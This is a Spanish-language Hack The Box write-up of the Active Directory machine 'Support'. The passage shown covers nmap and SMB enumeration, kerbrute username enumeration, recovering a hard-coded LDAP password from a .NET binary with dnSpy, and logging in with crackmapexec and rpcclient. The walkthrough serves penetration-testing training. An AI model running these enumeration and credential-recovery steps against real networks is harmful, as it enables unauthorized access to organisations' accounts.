---
title: "Support - Hack The Box"
date: 2024-09-28
draft: false
slug: "htb-write-up-support"
excerpt: "Esta es una máquina que para nada es fácil, ya que hay muchos pasos y conceptos de Directorio Activo (AD) que deberías de tener claros para completar la máquina. Como en todo AD, nos basamos mucho en la enumeración, empezamos enumerando el servicio SMB. Esto nos permitió descubrir y obtener un archivo comprimido que contenía un binario, que debugueamos con DNSpy para obtener la contraseña en texto claro del servicio LDAP. Con esta contraseña, entramos al servicio LDAP y lo enumeramos, pero al no encontrar mucho, utilizamos la herramienta ldapsearch con la que encontramos otra contraseña en texto claro de un usuario, esto nos llevó a aplicar Password Spraying con crackmapexec para encontrar al usuario al que le pertenecía la contraseña. Una vez encontrado el usuario, ganamos acceso a la máquina conectándonos usando Evil-WinRM, adentro cargamos SharpHound para recopilar información del AD, la información obtenida la analizamos con BloodHound y así descubrimos una computadora que podía ser comprometida, aplicando el ataque Resource-based Constrained Delegation. Aplicamos este ataque, lo que nos permitió generar una nueva cuenta en la computadora. Esto permite aplicar el ataque S4U y generar un Ticket de Servicio (TGS) con el que suplantamos al usuario administrador, conectándonos al servicio Kerberos usando Psexec.."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Active Directory", "SMB", "LDAP", "Kerberos", "SMB Enumeration", "Information Leakage", "Kerberos Enumeration", "Binary Analysis", "Analysis with DNSpy", "Debbuging with DNSpy", "LDAP Enumeration", "Password Spraying", "SharpHound and BloodHound Enumeration", "Resource-based Constrained Delegation Attack (RBCD Attack)", "S4U Attack", "Privesc - RBCD Attack", "Privesc - S4U Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "7z"
  - "unzip"
  - "kerbrute_linux_amd64"
  - "python3"
  - "máquina virtual Windows"
  - "openvpn client"
  - "dnspy.exe"
  - "rpcclient"
  - "evil-winrm"
  - "BloodHound 4.3.1"
  - "SharpHound 1.1.1"
  - "Neo4j 4x"
  - "Powermad.ps1"
  - "PowerView.ps1"
  - "Rubeus.exe"
  - "ticketConverter.py"
  - "impacket-getST"
  - "echo"
  - "tr"
  - "base64"
  - "export"
  - "impacket-psexec"
links:
  - "https://www.youtube.com/watch?v=gfM9uMT575w"
  - "https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/"
  - "https://github.com/ropnop/kerbrute"
  - "https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8"
  - "https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1"
  - "https://github.com/SpecterOps/BloodHound"
  - "https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1"
  - "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1?ref=blog.zsec.uk"
  - "https://deepinenespañol.org/wiki/ejecutar-binarios-de-windows/"
  - "https://neo4j.com/docs/operations-manual/current/installation/linux/debian/"
  - "https://docs.oracle.com/en/java/javase/23/install/installation-jdk-linux-platforms.html#GUID-CF001E7F-7E0D-49D4-A158-9CF3ED4C247C"
  - "https://www.azul.com/downloads/?package=jdk#zulu"
  - "https://openvpn.net/client/client-connect-vpn-for-windows/"
  - "https://docs.aws.amazon.com/corretto/latest/corretto-22-ug/generic-linux-install.html"
  - "https://github.com/BloodHoundAD/SharpHound"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"
  - "https://github.com/tothi/rbcd-attack"
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation"
  - "https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-support/Support.png"
---

Esta máquina es más complicada del nivel que menciona y al ser una máquina con directorio activo, serán necesarias las siguientes herramientas:
* **Máquina Windows 10** en un entorno virtual: <a href="https://www.youtube.com/watch?v=gfM9uMT575w" target="_blank">Cómo Instalar Windows 10 en VIRTUALBOX 2024 desde ISO 64 Bits (Paso a Paso)</a>
* Tener instalado la herramienta **DNSpy** en la **máquina Windows 10**: <a href="https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8" target="_blank">Repositorio de dnSpy: dnsSpy - Releases</a>
* Herramienta **Neo4j** instalada en nuestra máquina: <a href="https://neo4j.com/docs/operations-manual/current/installation/linux/debian/" target="_blank">Neo4j Manual Instalation: Debian-based distributions (.deb)</a>.

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.174
PING 10.10.11.174 (10.10.11.174) 56(84) bytes of data.
64 bytes from 10.10.11.174: icmp_seq=1 ttl=127 time=90.5 ms
64 bytes from 10.10.11.174: icmp_seq=2 ttl=127 time=92.9 ms
64 bytes from 10.10.11.174: icmp_seq=3 ttl=127 time=90.4 ms
64 bytes from 10.10.11.174: icmp_seq=4 ttl=127 time=75.4 ms

--- 10.10.11.174 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3014ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.174 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:54 CST
Initiating SYN Stealth Scan at 11:54
Scanning 10.10.11.174 [65535 ports]
Discovered open port 139/tcp on 10.10.11.174
Discovered open port 445/tcp on 10.10.11.174
Discovered open port 53/tcp on 10.10.11.174
Discovered open port 135/tcp on 10.10.11.174
Discovered open port 464/tcp on 10.10.11.174
Discovered open port 49664/tcp on 10.10.11.174
Discovered open port 3268/tcp on 10.10.11.174
Discovered open port 88/tcp on 10.10.11.174
Discovered open port 49678/tcp on 10.10.11.174
Increasing send delay for 10.10.11.174 from 0 to 5 due to 11 out of 30 dropped probes since last increase.
Discovered open port 636/tcp on 10.10.11.174
Discovered open port 389/tcp on 10.10.11.174
Discovered open port 9389/tcp on 10.10.11.174
Discovered open port 49667/tcp on 10.10.11.174
Discovered open port 49674/tcp on 10.10.11.174
Discovered open port 49699/tcp on 10.10.11.174
Increasing send delay for 10.10.11.174 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Completed SYN Stealth Scan at 11:55, 67.38s elapsed (65535 total ports)
Nmap scan report for 10.10.11.174
Host is up, received user-set (0.40s latency).
Scanned at 2024-09-27 11:54:16 CST for 67s
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 127
88/tcp    open  kerberos-sec  syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
389/tcp   open  ldap          syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
464/tcp   open  kpasswd5      syn-ack ttl 127
636/tcp   open  ldapssl       syn-ack ttl 127
3268/tcp  open  globalcatLDAP syn-ack ttl 127
9389/tcp  open  adws          syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49674/tcp open  unknown       syn-ack ttl 127
49678/tcp open  unknown       syn-ack ttl 127
49699/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 67.59 seconds
           Raw packets sent: 327681 (14.418MB) | Rcvd: 95 (4.172KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Aparecieron muchos puertos abiertos, y vemos varios qué nos indican a que nos estamos enfrentando, pero veamos qué información podemos obtener de estos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,636,3268,9389,49664,49667,49674,49678,49699 10.10.11.174 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 11:56 CST
Nmap scan report for 10.10.11.174
Host is up (0.083s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-27 17:56:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-27T17:57:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.52 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Para este punto, ya sabemos que nos enfrentamos a un **Directorio Activo (AD)** por lo que esto se puede complicar un poco.

Lo ideal ahorita es enumerar todo lo que podamos y empezaremos con el **servicio SMB**.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración de Servicio SMB {#SMB}

Vamos a empezar obteniendo información sobre el **servicio SMB** que está activo en la máquina.

Empecemos por obtener sus protocolos:
```bash
nmap -p 445 --script smb-protocols 10.10.11.174
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-27 12:00 CST
Nmap scan report for 10.10.11.174
Host is up (0.084s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-protocols: 
|   dialects: 
|     202
|     210
|     300
|     302
|_    311

Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
```
Si estoy en lo correcto, está usando **SMB2**. Saber esto es útil porque podemos usar la herramienta **Evil-WinRM** más adelante si es que la necesitamos, ya que esta necesita **SMB2** para funcionar.

Usemos la herramienta **crackmapexec** para ver qué información extra podemos obtener:
```bash
crackmapexec smb 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```
Muy bien, tenemos el sistema operativo y algo muy importante: el dominio. Al ser un directorio activo contra lo que nos enfrentamos, siempre es bueno obtener y registrar el dominio que utiliza.

Registremos el dominio en el **/etc/hosts**:
```bash
nano /etc/hosts
-------
10.10.11.174 dc dc.support.htb support.htb
```

Veamos si podemos listar los archivos compartidos, probemos primero con **smbclient**:
```bash
smbclient -L //10.10.11.174// -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
```
Está extraño ese error que nos marca.

Vamos a probar con la herramienta **smbmap** para más comodidad:
```bash
smbmap -H 10.10.11.174
[+] IP: 10.10.11.174:445        Name: 10.10.11.174
```

No nos reporta nada, agreguemos una sesión nula para ver si podemos listar los archivos compartidos:
```bash
smbmap -H 10.10.11.174 -u none
[+] Guest session       IP: 10.10.11.174:445    Name: support.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        support-tools                                           READ ONLY       support staff tools
        SYSVOL                                                  NO ACCESS       Logon server share
```

Excelente, veamos que hay en el **directorio support-tools**:
```bash
smbmap -H 10.10.11.174 -u none -r support-tools
[+] Guest session       IP: 10.10.11.174:445    Name: support.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        support-tools                                           READ ONLY
        .\support-tools\*
        dr--r--r--                0 Wed Jul 20 12:01:06 2022    .
        dr--r--r--                0 Sat May 28 06:18:25 2022    ..
        fr--r--r--          2880728 Sat May 28 06:19:19 2022    7-ZipPortable_21.07.paf.exe
        fr--r--r--          5439245 Sat May 28 06:19:55 2022    npp.8.4.1.portable.x64.zip
        fr--r--r--          1273576 Sat May 28 06:20:06 2022    putty.exe
        fr--r--r--         48102161 Sat May 28 06:19:31 2022    SysinternalsSuite.zip
        fr--r--r--           277499 Wed Jul 20 12:01:07 2022    UserInfo.exe.zip
        fr--r--r--            79171 Sat May 28 06:20:17 2022    windirstat1_1_2_setup.exe
        fr--r--r--         44398000 Sat May 28 06:19:43 2022    WiresharkPortable64_3.6.5.paf.exe
```
Veo que hay muchas herramientas, pero algo que resalta mucho es el archivo comprimido `UserInfo.exe.zip`. 

Vamos a descargarlo y a ver su contenido:
```bash
smbmap -H 10.10.11.174 -u none --download support-tools/UserInfo.exe.zip
[+] Starting download: support-tools\UserInfo.exe.zip (277499 bytes)
[+] File output to:...
```

Vamos a listar su contenido:
```bash
7z l UserInfo.exe.zip
Scanning the drive for archives:
1 file, 277499 bytes (271 KiB)
Listing archive: UserInfo.exe.zip
--
Path = UserInfo.exe.zip
Type = zip
Physical Size = 277499
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
------------------- ----- ------------ ------------  ------------------------
2022-05-27 11:51:05             652675       274861  12 files
```
Hay varios archivos, pero el que vuelve a resaltar es el binario `UserInfo.exe` y `UserInfo.exe.config`.

Descomprimamos ese archivo:
```bash
unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config
```

Analicemos esos dos archivos interesantes:
```bash
file UserInfo.exe.config
UserInfo.exe.config: XML 1.0 document, Unicode text, UTF-8 (with BOM) text, with CRLF line terminators
file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Analizando esos dos archivos, entendemos que el archivo `UserInfo.exe.config` es un archivo **XML** que no tiene información útil y el binario `UserInfo.exe` es un archivo **.NET** que solamente se puede ejecutar en una **máquina Windows** para poder ver qué hace.

Podríamos hacerlo también con la herramienta **Wine**, pero es mejor en una máquina Windows para entender mejor su funcionamiento.

Aun así, vamos a ver si podemos ver algo de información del binario `UserInfo.exe` si lo ejecutamos con el **comando strings**:
```bash
strings -e l UserInfo.exe
@%1;
        5W5
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
[-] At least one of -first or -last is required.
(givenName=
(sn=
(&(givenName=
)(sn=
[*] LDAP query to use: 
sAMAccountName
[-] No users identified with that query.
[+] Found 
 result       
[-] Exception: 
[*] Getting data for 
sAMAccountName=
pwdLastSet
lastLogon
givenName
mail
[-] Unable to locate 
. Please try the find command to get the user's username.
First Name:           
Last Name:            
Contact:              
Last Password Change: 
find
Find a user
user
Get information about a user
...
...
```

Nos dio bastante información útil, por ejemplo, un usuario llamado **armando**, que al parecer el binario funciona con el **servicio LDAP** y vemos un hash que parece una contraseña, pero no sabemos qué puede ser.

Hasta aquí dejaremos la enumeración de **SMB** y vamos a intentar enumerar usuarios en el **servicio Kerberos**.

### Enumeración de Servicio Kerberos {#kerberos}

Para hacer la enumeración de usuarios, necesitamos la herramienta **kerbrute**.

Si no la tienes, aquí la puedes encontrar:
* <a href="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3" target="_blank">Repositorio de ropnop: kerbrute - Releases</a>

Te compartire un blog sobre como funciona esta herramienta:
* <a href="https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/" target="_blank">A Detailed Guide on Kerbrute</a>

Cada vez que te encuentres con el **servicio Kerberos**, puedes probar a enumerar sus usuarios con la herramienta **kerbrute**.

Vamos a probar qué usuarios encontramos, usando un wordlists de **SecLists** que contendrá muchos nombres.

Ejecutemos la herramienta:
```bash
./kerbrute_linux_amd64

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/27/24 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

Debemos específicar **el tipo de ataque, el dominio, el dc (IP) y el wordlists**, probemoslo:
```bash
./kerbrute_linux_amd64 userenum -d support.htb --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/27/24 - Ronnie Flathers @ropnop

2024/09/27 12:38:42 >  Using KDC(s):
2024/09/27 12:38:42 >   10.10.11.174:88
2024/09/27 12:38:45 >  [+] VALID USERNAME:       support@support.htb
2024/09/27 12:38:47 >  [+] VALID USERNAME:       guest@support.htb
2024/09/27 12:38:58 >  [+] VALID USERNAME:       administrator@support.htb
2024/09/27 12:40:41 >  [+] VALID USERNAME:       Guest@support.htb
2024/09/27 12:40:42 >  [+] VALID USERNAME:       Administrator@support.htb
2024/09/27 12:44:32 >  [+] VALID USERNAME:       management@support.htb
2024/09/27 12:45:07 >  [+] VALID USERNAME:       Support@support.htb
C^
```
Detenemos la herramienta porque ya encontró varios usuarios, entre ellos el usuario **Support@support.htb** que puede ser uno de los que vayamos a usar más adelante.

Por ahora, es todo lo que podemos hacer aquí.

Vayamos a probar el binario `UserInfo.exe` que encontramos en una **máquina Windows**.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Binario en Máquina Windows y Aplicando Debbuging con DNSpy {#debugging}

#### Probando Binario en Máquina Windows {#binario}

Enciende una **máquina Windows 10**, envía el ZIP para descomprimirlo ahí y juega un poco con el binario `UserInfo.exe`.

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura1.png">
</p>

Abre un servidor en **Python** en donde tengas el archivo comprimido:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la **máquina Windows**, ve al navegador y pon la IP de tu **máquina Kali** y descarga el archivo comprimido:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura2.png">
</p>

Descomprime ese archivo y ahí estará el binario:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura3.png">
</p>

Te recuerdo, que este binario funciona dentro de la máquina víctima junto con **LDAP**, por lo que necesitaríamos estar conectados a la **VPN de HackTheBox** para poder alcanzar al **servicio LDAP**.

Necesitamos instalar en nuestra **máquina Windows el cliente de OpenVPN** para que podamos usar el archivo **VPN** que nos da **HackTheBox**.

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura4.png">
</p>

Solo tienes que arrastrar el **archivo VPN** al cliente y darle a la opción de conectar.

También debemos registrar el dominio que encontramos (**support.htb**) en el archivo **/etc/hosts** de Windows que se encuentra en la siguiente ruta: `C:\Windows\System32\drivers\etc\hosts`

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura5.png">
</p>

Ahora sí, vamos a probarlo con una **cmd**.

Ejecutemos el binario:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura6.png">
</p>

Ok, parece ser que podemos usar 2 comandos y quiero pensar que el **comando find** nos va a mostrar algo útil.

Probemos:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura7.png">
</p>

Podemos usar 2 argumentos. Si usamos el primero, nos pedirá que le demos un valor válido y si ponemos una letra, nos dirá que no lo encuentra, pero si ponemos un asterisco, observa lo que obtenemos:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura8.png">
</p>

Tenemos todos los usuarios, pero no es todo lo que podemos obtener.

#### Aplicando Debbuging con DNSpy {#dnspy}

Podemos aplicar **debugging** al binario con **DNSpy** (igual ya deberías tenerlo en tu **máquina Windows**), ábrelo y carga el binario:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura9.png">
</p>

Si analizamos el binario, veremos una clase llamada **Protected**, ahí encontraremos una contraseña que está encriptada. Dicha contraseña está dentro de una función llamada **getPassword**, está función aparece en una clase anterior llamada **LdapQuery**:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura10.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura11.png">
</p>

Centrémonos en la clase **LdapQuery**, aquí vemos como esta clase obtiene la contraseña y como la usa en el **servicio LDAP**, podemos usar toda la línea en donde está la variable que obtiene la contraseña para crear un breakpoint y se ejecute el binario hasta llegar a esa línea, con tal de ver si obtenemos la contraseña antes de que se encripte.

Esto lo haremos por pasos:

* Selecciona toda esa línea y presiona **F9** para que **DNSpy** use esa línea como **breakpoint**:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura12.png">
</p>

* Presiona **F5** para que ejecute el binario y podamos pasarle los argumentos que necesita el binario para que funcione:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura13.png">
</p>

* Observa que se detiene la ejecución del binario y se obtiene un valor nulo:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura14.png">
</p>

* Tenemos que ir un paso adelante para ver qué sucede. Ve a la pestaña **debbug** y elige la opción **paso sobre/step over o la tecla F10**, observa lo que obtenemos:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura15.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura16.png">
</p>

Tenemos la contraseña, ahora debemos saber a qué usuario le pertenece.

Lo bueno, es que ya sabemos que este binario funciona con el **servicio LDAP**, por lo que podríamos probarlo con **crackmapexec**:
```bash
crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Excelente, vamos a entrar al **servicio LDAP** y a enumerarlo.

### Enumeración de Servicio LDAP {#ldap}

Entremos al **servicio LDAP** y veamos qué usuarios encontramos con el comando `enumdomusers`:
```batch
rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
```
Tenemos varios usuarios que podemos ir anotando, pero sigamos enumerando.

Usemos el comando `querydispinfo` para ver si obtenemos información útil de los usuarios encontrados:
```batch
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf70 RID: 0x455 acb: 0x00000210 Account: anderson.damian        Name: (null)    Desc: (null)
index: 0xfbb RID: 0x459 acb: 0x00000210 Account: bardot.mary    Name: (null)    Desc: (null)
index: 0xfbc RID: 0x45a acb: 0x00000210 Account: cromwell.gerard        Name: (null)    Desc: (null)
index: 0xfc0 RID: 0x45e acb: 0x00000210 Account: daughtler.mabel        Name: (null)    Desc: (null)
index: 0xfc2 RID: 0x460 acb: 0x00000210 Account: ford.victoria  Name: (null)    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: hernandez.stanley      Name: (null)    Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfbf RID: 0x45d acb: 0x00000210 Account: langley.lucy   Name: (null)    Desc: (null)
index: 0xf6b RID: 0x450 acb: 0x00000210 Account: ldap   Name: (null)    Desc: (null)
index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: levine.leopoldo        Name: (null)    Desc: (null)
index: 0xfbd RID: 0x45b acb: 0x00000210 Account: monroe.david   Name: (null)    Desc: (null)
index: 0xfba RID: 0x458 acb: 0x00000210 Account: raven.clifton  Name: (null)    Desc: (null)
index: 0xf6d RID: 0x452 acb: 0x00000210 Account: smith.rosario  Name: (null)    Desc: (null)
index: 0xfc1 RID: 0x45f acb: 0x00000210 Account: stoll.rachelle Name: (null)    Desc: (null)
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: support        Name: (null)    Desc: (null)
index: 0xf71 RID: 0x456 acb: 0x00000210 Account: thomas.raphael Name: (null)    Desc: (null)
index: 0xfbe RID: 0x45c acb: 0x00000210 Account: west.laura     Name: (null)    Desc: (null)
index: 0xf6f RID: 0x454 acb: 0x00000210 Account: wilson.shelby  Name: (null)    Desc: (null)
```
Nada que nos ayude.

Enumeremos los grupos con el comando `enumdomgroups`:
```batch
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
